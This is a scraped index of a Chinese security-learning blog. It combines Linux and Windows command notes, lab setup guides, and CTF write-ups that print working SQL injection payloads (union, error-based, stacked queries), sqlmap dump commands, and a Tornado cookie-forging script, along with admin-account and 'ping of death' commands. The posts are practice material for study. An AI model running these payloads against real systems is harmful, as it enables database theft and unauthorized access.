显示文件的全部内容 cat 1 2&gt;3 合并文件 wc 统计文件中的单次数量 字节数 行数 gzip bzip2 压缩命令 -d解压缩 tar -cvf 归档 tar -zxvf 某档包 解压某归档包 chmod 777 配置权限 rpm -ivh /media/Packages/manxxxxxxxx.rpm 用rpm装软件 rpm -qa 某软件包 查看是否装某软件包 rpm -e 某软件包 卸载 yum install 安装（前提）配置yum源 yum -y remove 卸载 apt-get install xxx 前提配置网络源 dpkg -i *.deb useradd 增加用户 su -用户 切换用户 userdel 删除用户 -r 家目录一起删除 ifconfig 查看网络接口信息 netstat 查看端口 /etc/sysconfig/network-scripts/网络接口配置文件目录 service network restart 重启网络服务 ifdown eth0 禁用网络接口 ifup eth0 应用网络接口 /etc/resolv.conf 域名配置文件 vi编辑器三种模式 命令模式 进入编辑模式 进入底行模式 首先要进入命令模式 然后按 shift 和 ： 号 编译安装过程","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://m0th.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"电脑常识","slug":"电脑常识","permalink":"http://m0th.top/tags/%E7%94%B5%E8%84%91%E5%B8%B8%E8%AF%86/"}]},{"title":"windows系统基础","slug":"windows系统基础","date":"2020-04-29T13:19:16.000Z","updated":"2021-03-26T09:42:51.757Z","comments":true,"path":"2020/04/29/windows系统基础/","link":"","permalink":"http://m0th.top/2020/04/29/windows%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/","excerpt":"windows经常用，但是对于一些注册表还有环境变量都不是很熟悉，趁hacker学习这个号的资源，学一下","text":"windows经常用，但是对于一些注册表还有环境变量都不是很熟悉，趁hacker学习这个号的资源，学一下 window系统要点windows系统目录要点开机启动C:\\Users\\HP\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ 快捷访问方式 win+r 输入 shell:startup 存放账户密码SAMC:\\Windows\\System32\\config\\SAM 日志存放在 Perflogs服务查看计算机开启了那些服务win+r 输入services.msc web服务 （网站） dns服务 （域名解析） dhcp服务（自动给客户端分发ip） SMIT服务 （邮件服务） telnet服务 （远程连接） ssh服务 （远程连接） ftp服务（上传下载） smb （文件共享） 端口常见默认端口 http协议：80/8080/3128/9080 FTP协议（文件传输）：21 Tenlet协议（远程登入）：23 TFTP（简单文件传输）：69 SSH（安全远程登入） SCP（文件传输）端口重定向：22 SMTP（邮件）：25 POP3:110 TOMCAT:8080 WIN2003远程登入：3389 oracle数据库：1521 mysql sqlsever:1433 qq:1080 注册表操作系统的核心数据库打开方式：win+r 输入regedit 五大根键HKEY_CLASSES_ROOT HKEY_CURRENT_USER 管理当前用户信息 HKEY_LOCAL_MACHINE 管理系统硬件配置 HKEY_USERS HKEY_CURRENT_CONFIG 管理当前用户的系统配置 利用注册表防病毒HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices 查看注册表的开机启动信息 DOS命令color 改变当前颜色 ping -t -l 65500 ip 死亡之ping ipconfig 查看ip ipconfig /release 释放ip ipconfig /renew 重新获取ip systeminfo 查看系统信息（可以看看它那些漏洞没打补丁） arp -a 查询现在所有接口下同一个网段的地址 net view 查看局域网其他ip的地址 shutdown -s -t 180 -c “you are hacked by moth” dir 查看目录 cd 切换目录 start www.baidu.com 打开网页 start 123.txt 打开文件 copy con c:\\123.txt 创建文件 md 创建目录 rd 删除目录 ren 原文件名 新文件名 del 删除文件 copy 复制文件 move 移动文件 tree 树形文件夹结构列出 telnet ip 远程连接 net use k: \\\\192.168.1.1\\c$ net use k: \\\\192.168.1.1\\c$ \\del net start 服务名 打开服务 net stop 服务名 关闭服务 net use 用户名 密码 /add 建立用户 net user guest /active:yes 激活guest用户 net user 查看有哪些用户 net user 账户名 查看账户的属性 net localgroup administrators 用户名 /add 把该用户添加到管理员中 net user guest 12345 将guest 用户登入后将密码改为123456 net password 密码 更改系统登入密码 net share 查看本地开启的共享 net share ipc$ 开启ipc$ 共享 net share c$ /del 刪除c 共享 netstat -a 查看开启了那些端口 netstat -n 查看端口的网络连接情况 netstat -v 查看正在进行的工作 at id号 开启已注册的某个计划任务 at 查看所有的计划任务 attrib 文件名（目录名）查看某文件(或者目录)的属性 attrib 文件名 -A -R -S -H 或者 +A +R +S +H 去掉（添加）某文件的存档，只读，系统，隐藏属性 批处理文件后缀名.bat将多组dos命令集中到一起执行 快捷键ctrl + a 全选 ctrl +x 剪切 ctrl + c 复制 ctrl +v 粘贴 ctrl+s 保存 ctrl +z 撤销 ctrl +alt +del 任务管理器 F1 查找帮助 F2 重命名 F3 查找 ctrl +F4 关闭当前端口 F5 刷新 F6 快速查找地址栏 F10 打开菜单 F11 最大化端口 delete 删除 SHIFT delete 强删除（不过回收站1） win+d 显示桌面再按一下反回 win +r 打开运行对话空 win +m 最小化 win +e 打开文件资源管理器 ctrl +tab 三D桌面","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://m0th.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"电脑常识","slug":"电脑常识","permalink":"http://m0th.top/tags/%E7%94%B5%E8%84%91%E5%B8%B8%E8%AF%86/"}]},{"title":"dvwa环境搭建","slug":"dvwa环境搭建","date":"2020-04-15T13:20:57.000Z","updated":"2020-08-09T14:10:20.323Z","comments":true,"path":"2020/04/15/dvwa环境搭建/","link":"","permalink":"http://m0th.top/2020/04/15/dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"dvwa基本在安全入门的时候都用到了，最近在学习写一些ctfweb题的代码，更深一步的学习漏洞内部的代码逻辑，想先审计一些漏洞环境的代码，首选了dvwa，但是发现自己不知道什么时候卸载了，于是为了自己方便或者其他的入门者方便吧，写一个搭建过程吧","text":"dvwa基本在安全入门的时候都用到了，最近在学习写一些ctfweb题的代码，更深一步的学习漏洞内部的代码逻辑，想先审计一些漏洞环境的代码，首选了dvwa，但是发现自己不知道什么时候卸载了，于是为了自己方便或者其他的入门者方便吧，写一个搭建过程吧 下载地址phpstudy（新手的话可以采用这种集成的环境，但是还是建议要手动搭建一下web环境比如手动搭建lamp）：https://www.xp.cn/dvwa官网或github上下载dvwa：http://www.dvwa.co.uk/ 搭建过程先打开phpstudy开启apache和mysql服务把下载好的dvwa放到phpstudy的www目录下创建网站配置如上 打开配置路径复制该文件并粘贴到此目录下修改为config.inc.php打开config.inc.php文件 将密码修改为你的数据库密码默认root不清楚的查这里访问dvwa点击创建数据库应该有个创建页面但是我创建好了截不到图了然后登入默认用户名密码为admin，password完成","categories":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://m0th.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://m0th.top/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"[SUCTF 2019]EasySQL","slug":"SUCTF-2019-EasySQL","date":"2020-03-24T14:15:54.000Z","updated":"2021-02-05T05:24:43.058Z","comments":true,"path":"2020/03/24/SUCTF-2019-EasySQL/","link":"","permalink":"http://m0th.top/2020/03/24/SUCTF-2019-EasySQL/","excerpt":"这个题不知道查询语句的源代码是真的难写所查看大佬的博客：https://www.cnblogs.com/chrysanthemum/p/11729891.htmlhttps://blog.csdn.net/qq_44657899/article/details/104533077","text":"这个题不知道查询语句的源代码是真的难写所查看大佬的博客：https://www.cnblogs.com/chrysanthemum/p/11729891.htmlhttps://blog.csdn.net/qq_44657899/article/details/104533077 尝试之路加wp只有一个文本提交框发现可以堆叠注入，用show命令可得到 库名 为ctf，表名Flag尝试读表，fuzz过一遍发现handler 和prepare都过滤了于是懵逼查看大佬们的wp，说比赛时泄露了源代码 1select $_GET[&#x27;query&#x27;] || flag from flag 于是只需将’||’设置来实现字符串拼接就好于是payload 11;set sql_mode=PIPES_AS_CONCAT;select 1 非预期解1*,1 过滤不严导致 学到的姿势@sql_modesql_mode系统变量@sql_modesql_mode：是一组mysql支持的基本语法及校验规则查看全局的sql_mode:查看当前的sql_mode:设置sql_mode:\\","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"修电脑记录","slug":"修电脑记录","date":"2020-03-20T13:20:14.000Z","updated":"2021-03-26T09:11:32.779Z","comments":true,"path":"2020/03/20/修电脑记录/","link":"","permalink":"http://m0th.top/2020/03/20/%E4%BF%AE%E7%94%B5%E8%84%91%E8%AE%B0%E5%BD%95/","excerpt":"好多次帮同学解决电脑了，后来想想不如把这个经历写成一个文档，自己翻或者直接把文档给同学也方便","text":"好多次帮同学解决电脑了，后来想想不如把这个经历写成一个文档，自己翻或者直接把文档给同学也方便 2020/3/20帮同学修电脑，wifi能连接但是上不了网，ie回显报错是dns服务器的问题但是经过排查，发现dns服务没有问题。尝试ping命令发现能ping通百度，但是浏览器和用到网络资源的软件都没办法上网。于是考虑是网络接口系统文件的问题。经过百度，了解了一下netsh winsock reset命令，成功解决这一问题。 netsh winsock resetnetsh winsock reset命令，作用是重置 Winsock 目录。如果一台机器上的Winsock协议配置有问题的话将会导致网络连接等问题，就需要用netsh winsock reset命令来重置Winsock目录借以恢复网络。这个命令可以重新初始化网络环境，以解决由于软件冲突、病毒原因造成的参数错误问题。 netsh是一个能够通过命令行操作几乎所有网络相关设置的接口，比如设置IP，DNS，网卡，无线网络等，Winsock是系统内部目录，Winsock是Windows网络编程接口，winsock工作在应用层，它提供与底层传输协议无关的高层数据传输编程接口，reset是对Winsock的重置操作。当执行完winsock的命令重启计算机后，需要重新配置IP。 能解决的电脑问题安装广告软件，间谍软件，VPN或防火墙后无法联网。无法访问任何网页或只能访问某些网页。出现与网络相关问题的弹出错误窗口。由于注册表错误，没有网络连接。发生DNS查找问题。无法续订网络适配器的IP地址或其他一些DHCP错误。没有连接消息的网络连接问题。 2020/5/14补充电脑遇上了dns解析的问题而无法上网cmd中使用 ipconfig/flushdns 清理一下dns缓存就好了 2021/1/8 git遇上了些小问题本地推送代码带Git仓库失败,报错Logon failed, use ctrl+c to cancel basic credential prompt. 推送的时候弹出githup的登陆框,账号密码正确但是提示不正确 解决方法:在网页上登陆你自己的githup账号,点击右上角头像–&gt; setting –&gt; Developer settings –&gt; Personal access tokens页面 新建完成,页面已经有一个新的token,这个页面先不要动,或者先复制出来,页面刷新后这个token就看不见了 回到git bash 继续提交,在githup登陆弹出框中输入账号密码,第一次输入的是你githup的账号密码,第二次弹出后输入git账号,密码换成刚刚生成的token. 如果两次错误,会提示你在git bash中输入账号,之后会弹出一个密码框,这个也是输入token 总之,账号还是输入你自己的git账号,密码,第二次之后输入token","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://m0th.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"电脑常识","slug":"电脑常识","permalink":"http://m0th.top/tags/%E7%94%B5%E8%84%91%E5%B8%B8%E8%AF%86/"}]},{"title":"[护网杯]easy_tornado","slug":"护网杯-easy-tornado","date":"2020-03-09T14:16:57.000Z","updated":"2021-02-26T09:42:09.134Z","comments":true,"path":"2020/03/09/护网杯-easy-tornado/","link":"","permalink":"http://m0th.top/2020/03/09/%E6%8A%A4%E7%BD%91%E6%9D%AF-easy-tornado/","excerpt":"服务端模板注入也是一种注入攻击（简称为SSTL）这又涉及到了本人的知识盲区借这个题学习补充一下知识","text":"服务端模板注入也是一种注入攻击（简称为SSTL）这又涉及到了本人的知识盲区借这个题学习补充一下知识 自己走过的路加wp辅助信息收集加思路推理点击一下/welcome.txt回显 render而且url处有异常同理测试其他选项通过猜测可知filehash的值就是/hint.txt中的算法得到的从而我们只要得到cookie_secret的值即可通过脚本的到于/fllllllllllllag对应的filename的值 模板注入拿到cookie_secretget传参 1?filename=/fllllllllllllag&amp;filehash= 回显发现可疑参数msg结合上面提示render进行测试msg=1发现有回显，存在漏洞查找大佬的wp得知(来源，非常感谢大佬)在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量于是访问如下参数拿到了cookie_secret 小小的脚本12345678import hashlibfilename = &#x27;/fllllllllllllag&#x27;cookie_secret = &#x27;7012f546-ae20-45cb-8b05-19bf1e96d0bf&#x27;file_md5 = hashlib.md5(filename.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()print(hashlib.md5((cookie_secret+file_md5).encode(encoding=&quot;UTF-8&quot;)).hexdigest()) 访问拿到flag 知识点总结（参考各种大佬的文章，非原创）1.模板渲染参考senntyou师傅的文章前端与后端最初的渲染方式是后端模板渲染，就是由后端使用模板引擎渲染好 html 后，返回给前端，前端再用 js 去操作 dom 或者渲染其他动态的部分。前端请求一个地址 url后端接收到这个请求，然后根据请求信息，从数据库或者其他地方获取相应的数据使用模板引擎（如 java &gt; jsp、php &gt; smarty）将这些数据渲染成 html将 html 文本返回给前端 个人觉得就是后端模板引擎对数据的一种处理成html的方式 关于tornado模板的介绍 123456789101112&lt;html&gt; &lt;head&gt; &lt;title&gt;&#123;&#123; title &#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ul&gt; &#123;% for item in items %&#125; &lt;li&gt;&#123;&#123; escape(item) &#125;&#125;&lt;/li&gt; &#123;% end %&#125; &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; 渲染代码 1234class MainHandler(tornado.web.RequestHandler): def get(self): items = [&quot;Item 1&quot;, &quot;Item 2&quot;, &quot;Item 3&quot;] self.render(&quot;template.html&quot;, title=&quot;My title&quot;, items=items) 在引擎下, Tornado模板被直接转换为Python. 包含在你模板中的表达式会 逐字的复制到一个代表你模板的Python函数中. 2.SSTl攻击先推荐一个大佬在黑客大会发的东西https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf就引用一下niubl大佬的文章`以Twig为例 12345678&lt;?phprequire_once dirname(__FILE__).&#x27;/../lib/Twig/Autoloader.php&#x27;;Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); // 将用户输入作为模版变量的值echo $output; 使用 Twig 模版引擎渲染页面，其中模版含有 变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为： 1234567&lt;?phprequire_once dirname(__FILE__).&#x27;/../lib/Twig/Autoloader.php&#x27;;Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;); // 将用户输入作为模版内容的一部分echo $output; 上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出注入攻击的真谛：永远不要相信用户的输入 3.python3的md5()方法使用在python3的标准库中，已经移除了md5，而关于hash加密算法都放在hashlib这个标准库中，如SHA1、SHA224、SHA256、SHA384、SHA512和MD5算法等hexdigest()在英语中hex有十六进制的意思，因此该方法是将hash中的数据转换成数据，其中只包含十六进制的数字。 1234567# 或者可以这样（最常见的写法，常用于图片的命名）&gt;&gt;&gt; hashlib.md5(b&#x27;123&#x27;).hexdigest()&#x27;202cb962ac59075b964b07152d234b70&#x27; # 也可以使用hash.new()这个一般方法，hashlib.new(name[, data])，name传入的是哈希加密算法的名称，如md5&gt;&gt;&gt; hashlib.new(&#x27;md5&#x27;, b&#x27;123&#x27;).hexdigest()&#x27;202cb962ac59075b964b07152d234b70&#x27; 对中文进行加密时 1234&gt;&gt;&gt; import hashlib&gt;&gt;&gt; data = &#x27;你好&#x27;&gt;&gt;&gt; hashlib.md5(data.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()&#x27;7eca689f0d3389d9dea66ae112e5cfd7&#x27;","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"dvwa-sqli+sqlmap使用","slug":"dvwa-sqli-sqlmap使用","date":"2020-03-09T13:21:59.000Z","updated":"2020-12-11T11:28:29.072Z","comments":true,"path":"2020/03/09/dvwa-sqli-sqlmap使用/","link":"","permalink":"http://m0th.top/2020/03/09/dvwa-sqli-sqlmap%E4%BD%BF%E7%94%A8/","excerpt":"最近学了一下sqlmap的使用方式发现挺简单的，但是也要尝试练一练呀，想起了最初搭建的dvwa。。。（玩一波~~~）","text":"最近学了一下sqlmap的使用方式发现挺简单的，但是也要尝试练一练呀，想起了最初搭建的dvwa。。。（玩一波~~~） 注入流程level low手注low这个等级真的没啥好说的最简单的union查询列一下payload流程吧 1234561&#x27; order by 2# 测试列数1&#x27; union select 1,2# 测试回显位置1&#x27; union select 1,database()# 查看数据库名1&#x27; union select 1, table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;# 查表1&#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27;#查列1&#x27; union select 1,concat_ws(&#x27;~&#x27;,user,password) from users#查字段 sqlmap查看 dbms 当前数据库 和当前用户 1python2 sqlmap.py -u&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; -cookie=&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot; -b -current-db -current-user 查看 当前数据库中的表名 1python2 sqlmap.py -u&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; -cookie=&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot; -D dvwa --tables 查看表中的列名 1python2 sqlmap.py -u&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; -cookie=&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot; -D dvwa -T users --columns 查看字段并停止查询 1python2 sqlmap.py -u&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; -cookie=&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot; -D dvwa -T users -C user,password --dump 发现sqlmap还能生成临时文件并制作爆破字典真是一款强大的工具 level medium手注 画风突转变成了POST的方式，不过也没啥东西，用burp抓个包就绕过去了分析分析一波源代码看看过滤了什么使用了一个mysqli_real_escape_string()的php函数菜鸟教程讲https://www.runoob.com/php/func-mysqli-real-escape-string.html把用户输入数据中的 NUL（ASCII 0）、\\n、\\r、\\、’、” 和 Control-Z字符进行了转义然而发现查询语句为SELECT first_name, last_name FROM users WHERE user_id = $id并不是一定需要’号 库名表名等也可以用十六进制绕过如同上面low的payload 1234561 order by 2# 测试列数1 union select 1,2# 测试回显位置1 union select 1,database()# 查看数据库名1 union select 1, table_name from information_schema.tables where table_schema=0x64767761# 查表1 union select 1,column_name from information_schema.columns where table_name=0x7573657273#查列1 union select user,password from users##查字段 sqlmap注入点为post型参数时 sqlmap有两种利用方式一种和get形式类似只不过加上了Post的数据 1--data “id=1&amp;submit=submit” 1python2 sqlmap.py -u&quot;http://dvwa/vulnerabilities/sqli/&quot; -cookie=&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot; --data &quot;id=1&amp;submit=submit&quot; -b -current-db -current-user 另一种比较方便结合burppython2 sqlmap.py -r C:\\Users\\HP\\Desktop\\1.txt -current-db利用该文件进行注入，sqlmap操作流程如low level high手注fuzz一下发现除了语法报错不再显示详细错误情况之外好像没啥区别查看一下代码还真的没有过滤什么东西如同low（靶场水平真的醉了） 1234561&#x27; order by 2# 测试列数1&#x27; union select 1,2# 测试回显位置1&#x27; union select 1,database()# 查看数据库名1&#x27; union select 1, table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;# 查表1&#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27;#查列1&#x27; union select 1,concat_ws(&#x27;~&#x27;,user,password) from users#查字段 sqlmap发现查询页面和回显页面不同（好玩了）这应该算是一个二阶的注入了吧引进一个参数 second-url查询网站为http://dvwa/vulnerabilities/sqli/session-input.php回显网站为http://dvwa/vulnerabilities/sqli/sqlmap的命令可以这样写 1python2 sqlmap.py -r C:\\Users\\HP\\Desktop\\2.txt --second-url &quot;http://dvwa/vulnerabilities/sqli/&quot; -current-db 增加参数类似可以注入出来数据 记录一个坑我在用我的mysql服务中发现一但使用联合查询命令就会报错Illegal mix of collations for operation原理是utf8_general_ci 和utf8_unicode_ci排序规则冲突导致的所以全改为utf8_general_ci 就可以了","categories":[{"name":"ctf-tools","slug":"ctf-tools","permalink":"http://m0th.top/categories/ctf-tools/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"[极客大挑战 2019]几道经典的sql注入题","slug":"极客大挑战-2019-几道经典的sql注入题","date":"2020-02-03T16:16:07.000Z","updated":"2021-03-17T15:44:39.532Z","comments":true,"path":"2020/02/04/极客大挑战-2019-几道经典的sql注入题/","link":"","permalink":"http://m0th.top/2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/","excerpt":"极客大挑战中的几道经典sql注入","text":"极客大挑战中的几道经典sql注入 [极客大挑战 2019]EasySQL万能密码 [极客大挑战 2019]HardSQL0x01 信息收集简单fuzz 发现 union and if 空格等都被过滤了，考虑updataxml注入，并且用括号绕过空格 0x02 wp1234567admin&#x27;or(extractvalue(1,concat(0x7e,database()))or&#x27;admin&#x27;or(updatexml(1,concat(0x7e,database()),1))or&#x27;admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like&#x27;geek&#x27;),0x7e),1))or&#x27;admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#x27;H4rDsq1&#x27;),0x7e),1))or&#x27;admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))or&#x27;因为报错注入最多显错32字节,加上一个倒序的函数就好了admin&#x27;or(updatexml(1,concat(0x7e,reverse((select(group_concat(password))from(H4rDsq1))),0x7e),1))or&#x27;","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"sqli-labs环境搭建","slug":"sqli-labs环境搭建","date":"2020-02-02T13:13:51.000Z","updated":"2020-08-09T13:48:49.212Z","comments":true,"path":"2020/02/02/sqli-labs环境搭建/","link":"","permalink":"http://m0th.top/2020/02/02/sqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"在学sql注入，用线上的sqli靶机只能回显报错（这对新手不太友好），想着如果能过回显sql语句就好了，于是打算自己搭建一个sqli-labs靶机","text":"在学sql注入，用线上的sqli靶机只能回显报错（这对新手不太友好），想着如果能过回显sql语句就好了，于是打算自己搭建一个sqli-labs靶机 下载地址github上下载sqli的源代码这里phpstudy下载这里 搭建过程首先，在github上下载下来zip文件解压将该文件拖到phpstudy的www文件目录并且起一个比较简便的名字（我的是sqli）配置phpstudy打开mysql和apache搭建一个网站配置内容如下（端口号看您心情，别和别的重复就行）注意php版本一定要是5及以下，我当时的是7版本的就报错踩坑按目录找到该文件打开用记事本编辑将数据库密码填为你的数据库密码打开浏览器url处输入sqli/（这个和你配置的域名有关）点击红圈中的那一项搭建完成 实现我的目的，方便学习每当做题的时候可以修改index.php配置文件用notepad打开在sql语句下加这两句保存这样的话就可以看到sql语句了","categories":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://m0th.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"[强网杯]随便注","slug":"强网杯-随便注","date":"2019-12-04T14:18:03.000Z","updated":"2021-02-03T16:11:41.704Z","comments":true,"path":"2019/12/04/强网杯-随便注/","link":"","permalink":"http://m0th.top/2019/12/04/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"最近一直在学sql注入尝试练练ctf题中的sql注入，因为自己自动化工具还是不太会玩，所以选择一些纯手工注入的题，这个堆叠注入题还是蛮经典的","text":"最近一直在学sql注入尝试练练ctf题中的sql注入，因为自己自动化工具还是不太会玩，所以选择一些纯手工注入的题，这个堆叠注入题还是蛮经典的 自己走过的路加wp指导的心路历程0x01 注入检测123451&#x27; 报错1&#x27;# 正常1&#x27; or 1=1#正常,表中所有数据显露1&#x27; and 1=2#报错1&#x27; and 1=1#正常 可以得知存在注入 0x02 尝试获得该表中的列数11&#x27; order by 1# 通过更改 by后参数可知2列 0x03 尝试联合查询1-1&#x27;union select 1,2;# 发现select被正则过滤了 0x04 堆叠注入既然select 被过滤了那么就用show命令试试 1-1&#x27;;show tables;#- 查询得到两个表那么就表中查列试试 1-1&#x27;;show columns from `words`#这里插入代码片 再查另一表中列 1-1&#x27;;show columns from `1919810931114514`# 0x05 最后一步查数据 这里是最重要的一步，有两种方法 第一种 mysql预制语句配合堆叠注入以及strstr()函数漏洞 payload 1-1&#x27;;set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare stmt from @sql;EXECUTE stmt;# 拆开看 12345-1&#x27;;set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare stmt from @sql;EXECUTE stmt;# strst函数报错过不了可以采用大小写绕过 12345-1&#x27;;Set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);Prepare stmt from @sql;EXECUTE stmt;# 第二种通过alter修改列名和表名已知信息是flag列名所在表名为‘1919810931114514’而我们通过id查到的数据我们可以猜测为words表单所以我们可以猜测后端sql查询语言为 1select * from words where id= &#x27;&#x27;; 所以我们不妨1919810931114514表名把改为words；flag列名改为id，那么就可以得到flag了所以payload为 11&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(30);# wp引用学习来自http://www.saucer-man.com/information_security/302.html 踩过的坑与学到的知识坑1 对堆叠注入不了解在SQL中，分号（;）是用来表示一条sql语句的结束。 ; 结束一个sql语句后继续构造下一条语句，也就造就了堆叠注入。其实就是一次执行多个语句具体参考堆叠注入 坑2数字表名要加反引号 坑3sql 预处理语句语句的不了解预制语句的SQL语法基于三个SQL语句： 1PREPARE stmt_name FROM preparable_stmt; 预备一个语句，并赋予它名称stmt_name，preparable_stmt可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。 1EXECUTE stmt_name [USING @var_name [, @var_name] ...]; 使用一个EXECUTE语句（该语句引用了预制语句名称）来执行它。如果预制语句包含任何参数制造符，则您必须提供一个列举了用户变量（其中包含要与参数结合的值）的USING子句 1&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name; 要对一个预制语句解除分配，需使用DEALLOCATE PREPARE语句以下SQL语句可以被用在预制语句中：CREATE TABLE, DELETE, DO, INSERT, REPLACE, SELECT, SET, UPDATE和多数的SHOW语句。目前不支持其它语句。详细参考sql预处理语句 坑4strstr函数大小区分不了解strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。 注释：该函数是二进制安全的。 注释：该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 stristr() 函数。例如 12345&lt;?phpecho strstr(&quot;Hello world!&quot;,&quot;world&quot;); // 输出 world!?&gt; 详细参考菜鸟教程 坑5sql语法不太了解尤其是alter的用法详细参考https://www.w3school.com.cn/sql/sql_alter.asp","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"[HCTF 2018]WarmUp","slug":"HCTF-2018-WarmUp","date":"2019-11-09T14:19:21.000Z","updated":"2021-02-03T16:10:30.486Z","comments":true,"path":"2019/11/09/HCTF-2018-WarmUp/","link":"","permalink":"http://m0th.top/2019/11/09/HCTF-2018-WarmUp/","excerpt":"这个题好考文件包含，这个好像是某带cve编号的洞，不算难","text":"这个题好考文件包含，这个好像是某带cve编号的洞，不算难 wp上来一个超级滑稽脸（冥冥中仿佛滑稽看透了险恶的ctf世界的真相）。。F12或者开发者工具看源码注释中有提示那就访问一下源码得到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! 